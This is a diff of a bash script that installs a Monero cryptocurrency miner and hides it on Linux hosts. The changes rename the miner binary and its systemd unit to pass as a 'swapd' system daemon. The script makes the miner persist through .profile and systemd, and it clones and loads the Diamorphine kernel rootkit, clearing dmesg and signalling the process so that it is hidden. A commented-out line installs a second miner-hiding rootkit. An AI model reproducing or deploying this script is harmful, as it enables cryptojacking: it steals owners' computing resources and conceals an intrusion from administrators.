@@ -20,7 +20,7 @@ EMAIL=$2 # this one is optional
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_moneroocean_kswapd0.sh <wallet address> [<your email address>]"
+  echo "> setup_swapd_processhider.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -121,7 +121,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/.swapd/kswapd0.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.swapd/swapd.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -148,6 +148,7 @@ echo
 echo "[*] Removing previous moneroocean miner (if any)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop moneroocean_miner.service
+  sudo systemctl stop gdm2.service
 fi
 killall -9 xmrig
 killall -9 kswapd0
@@ -155,7 +156,7 @@ killall -9 kswapd0
 echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
-rm -rf $HOME/.swapd
+rm -rf $HOME/.gdm2
 rm -rf $HOME/.swapd
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
@@ -215,7 +216,7 @@ fi
 
 echo "[*] Miner $HOME/.swapd/xmrig is OK"
 
-mv $HOME/.swapd/xmrig $HOME/.swapd/kswapd0
+mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -232,7 +233,7 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.sw
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/xmrig.log'",#' $HOME/.swapd/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
@@ -271,30 +272,30 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_backgr
 
 killall xmrig
 
-echo "[*] Creating $HOME/.swapd/kswapd0.sh script"
-cat >$HOME/.swapd/kswapd0.sh <<EOL
+echo "[*] Creating $HOME/.swapd/swapd.sh script"
+cat >$HOME/.swapd/swapd.sh <<EOL
 #!/bin/bash
-if ! pidof kswapd0 >/dev/null; then
-  nice $HOME/.swapd/kswapd0 \$*
+if ! pidof swapd >/dev/null; then
+  nice $HOME/.swapd/swapd \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall kswapd0\" or \"sudo killall kswapd0\" if you want to remove background miner first."
+  echo "Run \"killall swapd\" or \"sudo killall swapd\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/.swapd/kswapd0.sh
+chmod +x $HOME/.swapd/swapd.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep .swapd/kswapd0.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.swapd/kswapd0.sh script to $HOME/.profile"
-    echo "$HOME/.swapd/kswapd0.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep .swapd/swapd.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/.swapd/swapd.sh script to $HOME/.profile"
+    echo "$HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/.swapd/kswapd0.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/.swapd/swapd.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/.swapd/xmrig.log file)"
-  bash $HOME/.swapd/kswapd0.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
+  bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -305,8 +306,8 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/.swapd/kswapd0.log file)"
-    bash $HOME/.swapd/kswapd0.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
+    bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -315,10 +316,10 @@ else
     echo "[*] Creating moneroocean systemd service"
     cat >/tmp/swapd.service <<EOL
 [Unit]
-Description=Swap Service
+Description=Swap Daemon Service
 
 [Service]
-ExecStart=$HOME/.swapd/kswapd0 --config=$HOME/.swapd/config.json
+ExecStart=$HOME/.swapd/swapd --config=$HOME/.swapd/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -328,31 +329,31 @@ WantedBy=multi-user.target
 EOL
     sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
     echo "[*] Starting swapd systemd service"
-    sudo killall kswapd0 2>/dev/null
+    sudo killall swapd 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable swapd.service
     sudo systemctl start swapd.service
-    echo "To see miner service logs run \"sudo journalctl -u swapd -f\" command"
+    echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
   fi
 fi
 
 #echo "[*] Installing r00tkit"
-#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 
-echo "[*] Installing Diamorphine r00tkit"
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+echo "[*] Installing Dia"
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b"
+  echo "sudo cpulimit -e swapd -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$acpulimit -e swapd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e swapd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
